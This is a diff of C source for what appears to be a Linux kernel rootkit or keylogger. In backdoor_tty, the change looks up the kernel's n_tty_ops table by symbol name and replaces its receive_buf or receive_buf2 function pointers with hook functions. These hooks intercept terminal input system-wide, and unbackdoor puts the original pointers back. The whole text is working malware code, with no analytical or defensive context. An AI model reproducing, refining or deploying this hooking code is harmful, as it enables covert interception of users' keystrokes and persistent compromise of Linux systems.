@@ -8,7 +8,7 @@
 
 atomic_t receive_buf_count;
 atomic_t receive_buf2_count;
-struct tty_struct *tty;
+struct tty_ldisc_ops *ops;
 
 void (*current_receive_buf)(struct tty_struct *, const unsigned char *, char *, int);
 int (*current_receive_buf2)(struct tty_struct *, const unsigned char *, char *, int);
@@ -26,15 +26,15 @@ backdoor_read(void)
 void
 backdoor_tty(void)
 {
-    if (!tty && (tty = get_current_tty())) {
-        if (tty->ldisc->ops->receive_buf2) {
+    if (!ops && (ops = (struct tty_ldisc_ops *)kallsyms_lookup_name("n_tty_ops"))) {
+        if (ops->receive_buf2) {
             atomic_set(&receive_buf2_count, 0);
-            current_receive_buf2 = tty->ldisc->ops->receive_buf2;
-            tty->ldisc->ops->receive_buf2 = g7_receive_buf2;
-        } else if (tty->ldisc->ops->receive_buf) {
+            current_receive_buf2 = ops->receive_buf2;
+            ops->receive_buf2 = g7_receive_buf2;
+        } else if (ops->receive_buf) {
             atomic_set(&receive_buf_count, 0);
-            current_receive_buf = tty->ldisc->ops->receive_buf;
-            tty->ldisc->ops->receive_buf = g7_receive_buf;
+            current_receive_buf = ops->receive_buf;
+            ops->receive_buf = g7_receive_buf;
         }
     }
 }
@@ -42,20 +42,18 @@ backdoor_tty(void)
 void
 unbackdoor(void)
 {
-     
-
-    if (tty) {
+    if (ops) {
         if (current_receive_buf2) {
+            ops->receive_buf2 = current_receive_buf2;
             while (atomic_read(&receive_buf2_count) > 0);
-            tty->ldisc->ops->receive_buf2 = current_receive_buf2;
             current_receive_buf2 = NULL;
         } else if (current_receive_buf) {
+            ops->receive_buf = current_receive_buf;
             while (atomic_read(&receive_buf_count) > 0);
-            tty->ldisc->ops->receive_buf = current_receive_buf;
             current_receive_buf = NULL;
         }
 
-        tty = NULL;
+        ops = NULL;
     }
 
     if (sys_read) {
